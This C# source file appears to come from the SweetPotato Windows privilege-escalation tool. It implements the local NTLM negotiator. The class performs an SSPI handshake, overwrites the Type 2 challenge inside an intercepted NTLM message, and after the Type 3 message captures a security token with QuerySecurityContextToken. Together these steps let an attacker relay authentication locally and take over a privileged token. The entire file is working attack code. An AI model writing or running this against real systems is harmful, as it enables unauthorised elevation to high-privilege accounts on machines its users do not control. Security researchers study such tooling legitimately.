using System;
using static SweetPotato.SSPIHelper;

namespace SweetPotato {

    internal class LocalNegotiator {

        const int ASC_REQ_ALLOCATE_MEMORY = 0x00000100;
        const int ASC_REQ_CONNECTION = 0x00000800;

        CtxHandle phContext = new CtxHandle();
        CredHandle hCred = new CredHandle();
        SecBufferDesc secServerBufferDesc;

        public bool Authenticated { get; private set; } = false;
        public IntPtr Token { get; private set; } = IntPtr.Zero;

        public byte[] Challenge { get {
                return secServerBufferDesc.GetSecBuffer().GetBytes();
            }
        } 

        public bool HandleType1(byte[] ntmlBytes) {

            TimeStamp ts = new TimeStamp();

            int status = AcquireCredentialsHandle(null, "Negotiate", SECPKG_CRED_INBOUND, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, hCred, ts);

            if (status != SEC_E_OK) {
                Console.WriteLine("[!] Error {0} result from AcquireCredentialsHandle", status);
                return false;
            }

            SecBufferDesc secClientBufferDesc = new SecBufferDesc(ntmlBytes);
            secServerBufferDesc = new SecBufferDesc(8192); 

            UInt32 fContextAttr;

            status = AcceptSecurityContext(hCred, null, ref secClientBufferDesc, ASC_REQ_CONNECTION,
                SECURITY_NATIVE_DREP, phContext, out secServerBufferDesc, out fContextAttr, ts);

            if(status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED) {
                Console.WriteLine("[!] Error {0} result from AcceptSecurityContext", status);
                return false;
            }

            return true;
        }

        public int HandleType2(byte[] ntlmBytes) {

            SecBuffer secBuffer = secServerBufferDesc.GetSecBuffer();
            byte[] newNtlmBytes = secBuffer.GetBytes();

            if (ntlmBytes.Length >= newNtlmBytes.Length) {
                for (int idx = 0; idx < ntlmBytes.Length; ++idx) {
                    if (idx < newNtlmBytes.Length) {
                        ntlmBytes[idx] = newNtlmBytes[idx];
                    } else {
                        ntlmBytes[idx] = 0;
                    }
                }
            } else {
                Console.WriteLine("NTLM Type2 cannot be replaced.  New buffer too big");
            }

            return 0;
        }

        public int HandleType3(byte[] ntmlBytes) {

            SecBufferDesc secClientBufferDesc = new SecBufferDesc(ntmlBytes);
            secServerBufferDesc = new SecBufferDesc(0);
            CtxHandle phContextNew = new CtxHandle();

            UInt32 fContextAttr;
            TimeStamp ts = new TimeStamp();

            int status = AcceptSecurityContext(hCred, phContext, ref secClientBufferDesc, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
                SECURITY_NATIVE_DREP, phContext, out secServerBufferDesc, out fContextAttr, ts);

            if (status == 0) {
                Authenticated = true;
                IntPtr hToken;
                if ((status = QuerySecurityContextToken(phContext, out hToken)) == 0) {
                    Token = hToken;
                }
            }

            return status;
        }
    }
}
